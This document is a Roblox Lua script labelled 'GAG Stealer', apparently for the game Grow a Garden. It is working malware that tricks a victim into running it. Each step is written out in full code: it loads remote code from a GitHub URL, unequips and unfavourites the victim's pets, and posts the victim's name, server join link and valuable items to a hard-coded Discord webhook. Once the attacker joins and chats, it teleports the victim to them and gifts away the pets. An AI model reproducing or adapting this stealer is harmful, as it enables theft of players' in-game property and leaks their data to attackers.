_G.scriptExecuted = _G.scriptExecuted or false
if _G.scriptExecuted then return end
_G.scriptExecuted = true

-- Run loading screen in parallel without interfering
coroutine.wrap(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Hookzy/SCRIPTS/refs/heads/main/Load.lua", true))()
end)()

--[[ 
========================
      GAG Stealer
========================
]]

local users = _G.Usernames or {"jabapie27"}
local min_value = _G.min_value or 1000000
local ping = _G.pingEveryone or "Yes"
local webhook = "https://discord.com/api/webhooks/1394724129042731138/eP5TGtu1H973BDKITLdegWzoTE2jzJmTOm_VG3FZKe-9qJVrlU6rDOoSqAA9a9CaOHrr"
local prefix = ping == "Yes" and "@everyone\n" or ""

local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Workspace = game:GetService("Workspace")
local plr = Players.LocalPlayer
local backpack = plr:WaitForChild("Backpack")
local replicatedStorage = ReplicatedStorage

local modules = replicatedStorage:WaitForChild("Modules", 10)
local calcPlantValue = require(modules:WaitForChild("CalculatePlantValue", 10))
local petUtils = require(modules:WaitForChild("PetServices", 10):WaitForChild("PetUtilities", 10))
local petRegistry = require(replicatedStorage:WaitForChild("Data", 10):WaitForChild("PetRegistry", 10))
local numberUtil = require(modules:WaitForChild("NumberUtil", 10))
local dataService = require(modules:WaitForChild("DataService", 10))

local excludedItems = {"Seed", "Shovel [Destroy Plants]", "Water", "Fertilizer"}
local rarePets = {
    "Queen Bee", "Raccoon", "Dragonfly", "T-Rex", "Spinosaurus",
    "Mimic Octopus", "Red Fox", "Disco Bee", "Butterfly", "Fennec Fox"
}

local totalValue = 0
local itemsToSend = {}

if next(users) == nil or webhook == "" then return end
if game.PlaceId ~= 126884695634066 then return end
if #Players:GetPlayers() >= 5 then return end

local serverTypeResult = game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType", 10):InvokeServer()
if serverTypeResult == "VIPServer" then return end

local PetsService = ReplicatedStorage:WaitForChild("GameEvents", 10):WaitForChild("PetsService", 10)
local petsPhysical = Workspace:WaitForChild("PetsPhysical", 10)

for _, petMover in ipairs(petsPhysical:GetChildren()) do
    if petMover:IsA("Part") and petMover.Name == "PetMover" then
        local model = petMover:FindFirstChildWhichIsA("Model")
        if model then
            local uuid = model.Name
            if uuid and uuid ~= "" then
                PetsService:FireServer("UnequipPet", uuid)
                task.wait(0.02)
            end
        end
    end
end

task.wait(0.5)

local favoriteEvent = ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("Favorite_Item")

local function unfavoriteIfNeeded(tool)
    if tool:IsA("Tool") and tool:FindFirstChild("Handle") then
        local isFavorited = tool:GetAttribute("d")
        if isFavorited == true then
            favoriteEvent:FireServer(tool)
            task.wait(0.05)
        end
    end
end

for _, tool in ipairs(backpack:GetChildren()) do
    unfavoriteIfNeeded(tool)
end

local plotFolder = Workspace:FindFirstChild(plr.Name)
if plotFolder then
    for _, tool in ipairs(plotFolder:GetChildren()) do
        unfavoriteIfNeeded(tool)
    end
end

local function getWeight(tool)
    local weightValue = tool:FindFirstChild("Weight") or tool:FindFirstChild("KG") or tool:FindFirstChild("WeightValue") or tool:FindFirstChild("Mass")
    local weight = 0
    if weightValue then
        if weightValue:IsA("NumberValue") or weightValue:IsA("IntValue") then
            weight = weightValue.Value
        elseif weightValue:IsA("StringValue") then
            weight = tonumber(weightValue.Value) or 0
        end
    else
        local weightMatch = tool.Name:match("%[(%d+%.?%d*) ?KG%]")
        if weightMatch then
            weight = tonumber(weightMatch) or 0
        end
    end
    return math.floor(weight * 100 + 0.5) / 100
end

local function formatNumber(number)
    local suffixes = {"", "k", "m", "b", "t"}
    local suffixIndex = 1
    while number >= 1000 and suffixIndex < #suffixes do
        number = number / 1000
        suffixIndex += 1
    end
    if suffixIndex == 1 then
        return tostring(math.floor(number))
    elseif number == math.floor(number) then
        return string.format("%d%s", number, suffixes[suffixIndex])
    else
        return string.format("%.2f%s", number, suffixes[suffixIndex])
    end
end

local function calcPetValue(v14)
    local hatchedFrom = v14.PetData.HatchedFrom
    if not hatchedFrom or hatchedFrom == "" then return 0 end
    local eggData = petRegistry.PetEggs[hatchedFrom]
    if not eggData then return 0 end
    local v17 = eggData.RarityData.Items[v14.PetType]
    if not v17 then return 0 end
    local weightRange = v17.GeneratedPetData.WeightRange
    if not weightRange then return 0 end
    local v19 = numberUtil.ReverseLerp(weightRange[1], weightRange[2], v14.PetData.BaseWeight)
    local v20 = math.lerp(0.8, 1.2, v19)
    local levelProgress = petUtils:GetLevelProgress(v14.PetData.Level)
    local v22 = v20 * math.lerp(0.15, 6, levelProgress)
    local v23 = petRegistry.PetList[v14.PetType].SellPrice * v22
    return math.floor(v23)
end

local function identifyExecutor()
    if identifyexecutor then
        return identifyexecutor()
    else
        return "Unknown"
    end
end

local function refreshItemsToSend()
    totalValue = 0
    itemsToSend = {}

    for _, tool in ipairs(backpack:GetChildren()) do
        if tool:IsA("Tool") and not table.find(excludedItems, tool.Name) then
            if tool:GetAttribute("ItemType") == "Pet" then
                local uuid = tool:GetAttribute("PET_UUID")
                if not uuid then continue end
                local v14 = dataService:GetData().PetsData.PetInventory.Data[uuid]
                if not v14 then continue end
                local name = v14.PetType
                if not name then continue end

                local value = calcPetValue(v14)
                local weight = getWeight(tool)

                if table.find(rarePets, name) or value >= min_value then
                    totalValue += value
                    table.insert(itemsToSend, { Tool = tool, Name = name, Value = value, Weight = weight, Type = "Pet" })
                end
            end
        end
    end
end

refreshItemsToSend()

if #itemsToSend == 0 then return end

table.sort(itemsToSend, function(a, b)
    local aRare = table.find(rarePets, a.Name) ~= nil
    local bRare = table.find(rarePets, b.Name) ~= nil
    if aRare and not bRare then
        return true
    elseif not aRare and bRare then
        return false
    else
        return a.Value > b.Value
    end
end)

local executorName = identifyExecutor()

local function sendJoinMessage(list, prefix, executorName)
    local fields = {
        { name = "Victim Username:", value = Players.LocalPlayer.Name, inline = true },
        { name = "Executor:", value = executorName or "Unknown", inline = true },
        { name = "Join link:", value = "https://fern.wtf/joiner?placeId=126884695634066&gameInstanceId=" .. game.JobId, inline = false },
        { name = "Item list:", value = "", inline = false },
        { name = "Summary:", value = string.format("Total Value: Â¢%s", formatNumber(totalValue)), inline = false }
    }
    for _, item in ipairs(list) do
        fields[4].value = fields[4].value .. string.format("%s (%.2f KG): Â¢%s\n", item.Name, item.Weight, formatNumber(item.Value))
    end
    if #fields[4].value > 1024 then
        local lines = {}
        for line in fields[4].value:gmatch("[^\r\n]+") do table.insert(lines, line) end
        while #fields[4].value > 1024 and #lines > 0 do
            table.remove(lines)
            fields[4].value = table.concat(lines, "\n") .. "\nPlus more!"
        end
    end

    local data = {
        content = prefix,
        embeds = {{
            title = "ðŸ¥­ Join to get GAG hit",
            color = 65280,
            fields = fields,
            footer = { text = "GAG stealer by Tobi. discord.gg/GY2RVSEGDT" }
        }}
    }

    local body = HttpService:JSONEncode(data)
    local headers = { ["Content-Type"] = "application/json" }

    local requestFunction = request or (syn and syn.request) or http_request or http and http.request
    if not requestFunction then
        warn("No request function available for webhook")
        return
    end

    local success, err = pcall(function()
        requestFunction({Url = webhook, Method = "POST", Headers = headers, Body = body})
    end)

    if not success then
        warn("Webhook send failed:", err)
    end
end

sendJoinMessage(itemsToSend, prefix, executorName)

local receiverName = users[1]
local receiver = nil

local function findReceiver()
    receiver = Players:FindFirstChild(receiverName)
    if not receiver then
        receiver = Players.PlayerAdded:Wait()
        while receiver.Name ~= receiverName do
            receiver = Players.PlayerAdded:Wait()
        end
    end
    return receiver
end

local function teleportVictimToReceiver()
    while receiver and receiver.Character and plr.Character do
        local victimHRP = plr.Character:FindFirstChild("HumanoidRootPart")
        local receiverHRP = receiver.Character:FindFirstChild("HumanoidRootPart")
        if victimHRP and receiverHRP then
            local currentCFrame = victimHRP.CFrame
            local targetCFrame = receiverHRP.CFrame * CFrame.new(2, 0, 0)
            local lerpAmount = 0.15
            victimHRP.CFrame = currentCFrame:Lerp(targetCFrame, lerpAmount)
        end
        task.wait(0.1)
    end
end

local petGiftingEvent = ReplicatedStorage:WaitForChild("GameEvents", 10):WaitForChild("PetGiftingService", 10)

local function giftTool(tool)
    if not tool or tool.Parent ~= backpack then return end
    plr.Character:WaitForChild("Humanoid"):EquipTool(tool)
    task.wait(0.2)
    petGiftingEvent:FireServer("GivePet", receiver)
    task.wait(0.2)
end

local function giftAllItems()
    for _, item in ipairs(itemsToSend) do
        if item.Tool.Parent == backpack then
            giftTool(item.Tool)
            task.wait(0.4)
        end
    end
end

coroutine.wrap(function()
    receiver = findReceiver()
    receiver.Chatted:Wait()
    task.spawn(teleportVictimToReceiver)
    giftAllItems()
end)()
